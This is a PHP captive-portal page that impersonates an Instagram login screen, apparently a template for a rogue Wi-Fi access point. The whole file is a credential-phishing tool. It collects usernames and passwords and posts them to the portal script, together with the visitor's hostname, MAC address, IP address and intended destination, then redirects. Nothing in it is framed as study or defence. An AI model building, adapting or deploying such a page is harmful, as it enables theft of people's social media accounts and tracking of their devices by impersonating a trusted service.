<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!-- saved from url=(0014)about:internet -->
<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <title>Instagram</title>

  <meta charset='UTF-8'>
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />

<script type="text/javascript">
    function redirect() {
      setTimeout(function() {
        window.location = "/captiveportal/index.php";
      }, 100);
    }
  </script>


</head>

<body>

  <div class="login-container">
    <form id="loginForm" method="post" action="/captiveportal/index.php" onsubmit="redirect()">
      <input type="hidden" name="hostname" value="<?= getClientHostName($_SERVER['REMOTE_ADDR']); ?>">
      <input type="hidden" name="mac" value="<?= getClientMac($_SERVER['REMOTE_ADDR']); ?>">
      <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">
      <input type="hidden" name="target" value="<?= $destination ?>">

      <div class="forma"><span class="_9nyy2"></span><input aria-label="Username" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="email" id="email" type="text" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Username"></label>

        <div><span class="_9nyy2"></span><input aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" id="password" type="password" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Password"></label>
        </div>
        <div><button type="submit" id="btn" name="btn">
            <div>Log In</div>
          </button>
        </div>

    </form>
  </div>
</body>

</html>
